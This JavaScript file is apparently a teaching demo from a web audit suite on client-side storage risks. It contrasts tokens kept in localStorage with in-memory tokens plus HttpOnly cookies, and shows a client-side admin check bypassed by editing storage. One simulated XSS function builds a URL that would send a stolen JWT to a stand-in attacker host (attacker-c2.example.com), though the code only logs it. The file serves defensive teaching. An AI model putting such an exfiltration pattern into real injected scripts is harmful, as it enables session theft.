/**
 * Client-Side Storage & Authentication Security Demonstration
 * 
 * Demonstrates:
 * 1. Safe uses of LocalStorage (UI flags, non-sensitive preferences like cynbit_newsletter_seen).
 * 2. High-risk anti-patterns (storing JWTs / refresh tokens in LocalStorage).
 * 3. Why LocalStorage is vulnerable to Cross-Site Scripting (XSS) exfiltration.
 * 4. Recommended secure pattern: In-memory access token + HttpOnly cookie + CSRF header.
 * 5. Why frontend storage must NEVER be treated as an authorization mechanism.
 * 
 * Part of Cynbit Backend Technical Audit Reference Suite.
 */

// ============================================================================
// 1. MOCK ENVIRONMENT SETUP (Enables standalone execution in Node.js or Browser)
// ============================================================================
const memoryStorage = {};
const mockLocalStorage = {
    setItem: (key, val) => { memoryStorage[key] = String(val); },
    getItem: (key) => memoryStorage[key] || null,
    removeItem: (key) => { delete memoryStorage[key]; },
    clear: () => { Object.keys(memoryStorage).forEach(k => delete memoryStorage[k]); }
};

const storage = (typeof localStorage !== 'undefined') ? localStorage : mockLocalStorage;

console.log("=================================================================");
console.log("CLIENT-SIDE STORAGE SECURITY DEMONSTRATION & ARCHITECTURE AUDIT");
console.log("=================================================================\n");

// ============================================================================
// 2. SAFE STORAGE PATTERN (Observed on Cynbit)
// ============================================================================
console.log("--- 1. SAFE LOCAL STORAGE USAGE (Observed on cynbit.in) ---");

// Safe: Non-sensitive UI preference flags and analytics references
storage.setItem("cynbit_newsletter_seen", "true");
storage.setItem("gcl_ls", "google_click_id_tracking_data_12345");
storage.setItem("theme_preference", "dark");

console.log("Stored safe key 'cynbit_newsletter_seen':", storage.getItem("cynbit_newsletter_seen"));
console.log("Stored safe key 'gcl_ls':", storage.getItem("gcl_ls"));
console.log("Result: PASS. These keys contain zero authentication secrets or PII.\n");


// ============================================================================
// 3. INSECURE STORAGE ANTI-PATTERN (Why NOT to store tokens in LocalStorage)
// ============================================================================
console.log("--- 2. INSECURE STORAGE ANTI-PATTERN (Vulnerable to XSS) ---");

// ANTI-PATTERN: Storing authentication tokens in LocalStorage
function simulateInsecureLogin(token) {
    storage.setItem("auth_token", token);
    console.log("[INSECURE] Saved access token in LocalStorage:", token.substring(0, 15) + "...");
}

// SIMULATION: Attacker injecting a Cross-Site Scripting (XSS) payload
// Any script loaded via CDN, supply chain dependency, or DOM XSS can execute this:
function simulateXSSAttack() {
    console.log("\n[ATTACK SIMULATION] Malicious script injected via XSS vulnerability executes:");
    const stolenToken = storage.getItem("auth_token");
    const simulatedExfiltrationURL = `https://attacker-c2.example.com/exfiltrate?stolen_jwt=${stolenToken}`;
    
    console.log(" -> Extracted credential from localStorage:", stolenToken);
    console.log(" -> Exfiltration payload dispatched to:", simulatedExfiltrationURL);
    console.log(" -> Result: CRITICAL VULNERABILITY. The attacker now permanently owns the session!\n");
}

simulateInsecureLogin("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.sensitive_payload.signature");
simulateXSSAttack();


// ============================================================================
// 4. RECOMMENDED SECURE ARCHITECTURE: In-Memory Token + HttpOnly Cookies
// ============================================================================
console.log("--- 3. RECOMMENDED PRODUCTION PATTERN (Defense-in-Depth) ---");

/**
 * Secure Session Manager (Encapsulated in a private JavaScript closure).
 * - Access token resides strictly in private memory (RAM), never written to localStorage.
 * - Refresh token is stored in an HttpOnly, Secure, SameSite=Strict cookie managed by the browser.
 * - Anti-CSRF token is included in custom request headers.
 */
const SecureSessionManager = (() => {
    // Private variable inaccessible to window or external scripts
    let inMemoryAccessToken = null;
    let csrfToken = null;

    return {
        initializeSession: (token, csrf) => {
            inMemoryAccessToken = token;
            csrfToken = csrf;
            console.log("[SECURE] Access token initialized in private memory (Inaccessible via document.cookie or localStorage).");
        },

        getAuthenticatedHeaders: () => {
            const headers = {
                "Content-Type": "application/json"
            };
            if (inMemoryAccessToken) {
                headers["Authorization"] = `Bearer ${inMemoryAccessToken}`;
            }
            if (csrfToken) {
                headers["X-CSRF-Token"] = csrfToken;
            }
            return headers;
        },

        clearSession: () => {
            inMemoryAccessToken = null;
            csrfToken = null;
            console.log("[SECURE] Memory session cleared.");
        }
    };
})();

SecureSessionManager.initializeSession("short_lived_memory_access_token_abc123", "csrf_hmac_token_xyz789");
console.log("Authenticated Request Headers generated:", SecureSessionManager.getAuthenticatedHeaders());
console.log("Can XSS read inMemoryAccessToken from storage? Value:", storage.getItem("auth_token"));
console.log("Result: PASS. Attackers cannot dump private memory via localStorage API.\n");


// ============================================================================
// 5. WHY CLIENT STORAGE CAN NEVER BE TREATED AS AUTHORIZATION
// ============================================================================
console.log("--- 4. CLIENT STORAGE IS NEVER AN AUTHORIZATION CONTROL ---");

// Flawed Client-Side Logic (Never do this in production):
storage.setItem("user_role", "user");

function isUserAdminInsecure() {
    // FLAW: Client-side storage can be modified by the user at any time in DevTools
    return storage.getItem("user_role") === "admin";
}

console.log("Initial admin check:", isUserAdminInsecure()); // false

// Attacker simply types in browser DevTools:
storage.setItem("user_role", "admin");
console.log("Attacker tampered storage in DevTools. Admin check:", isUserAdminInsecure()); // true (Bypassed!)

console.log("\n[PRINCIPLE OF DEFENSE] Server-Side Authorization Rule:");
console.log(" -> The backend MUST validate authorization on EVERY request using cryptographic");
console.log("    session validation or cryptographically signed JWT claims verified server-side.");
console.log(" -> Never trust client-controlled cookies, localStorage, or headers for authorization decisions.");
console.log("\n=================================================================");
console.log("DEMONSTRATION COMPLETED SUCCESSFULLY");
console.log("=================================================================");
